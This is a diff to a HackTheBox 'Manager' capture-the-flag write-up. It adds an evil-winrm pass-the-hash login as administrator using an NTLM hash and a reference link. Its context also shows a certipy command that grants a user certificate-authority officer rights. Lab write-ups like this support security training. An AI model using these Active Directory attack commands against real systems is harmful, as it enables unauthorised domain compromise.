@@ -198,8 +198,13 @@ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username 'raven@manager.htb
 
 ![img_13.png](img/img_13.png)
 
-![img_14.png](img/img_14.png)
+```
+evil-winrm -u administrator -H ae5064c2f62317332c88629e025924ef -i manager.htb
+```
+
+![img.png](img/img_15.png)
 
 ### Reference:
 
-https://github.com/saoGITo/HTB_Manager/blob/main/HTB_Manager_poc.py
+- https://7mitu.github.io/2023/10/30/HackTheBox-Manager-WriteUP/
+- https://github.com/saoGITo/HTB_Manager/blob/main/HTB_Manager_poc.py
